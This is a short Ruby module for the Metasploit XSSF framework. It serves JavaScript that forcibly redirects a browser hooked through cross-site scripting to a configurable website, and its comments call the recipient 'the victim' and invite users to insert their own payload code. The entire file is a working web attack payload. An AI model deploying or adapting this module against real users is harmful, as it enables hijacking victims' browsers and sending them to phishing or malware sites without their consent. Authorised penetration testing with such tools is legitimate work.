require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'REDIRECT',
			'Description' => 'Simple HTTP redirection'
		))
		
		register_options(
			[
				OptString.new('Website', [true, "Redirection destination", 'http://www.google.fr/'])
			], self.class
		)
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		send_response(cli, %Q{window.location.replace('#{datastore['Website']}');})
	end
end
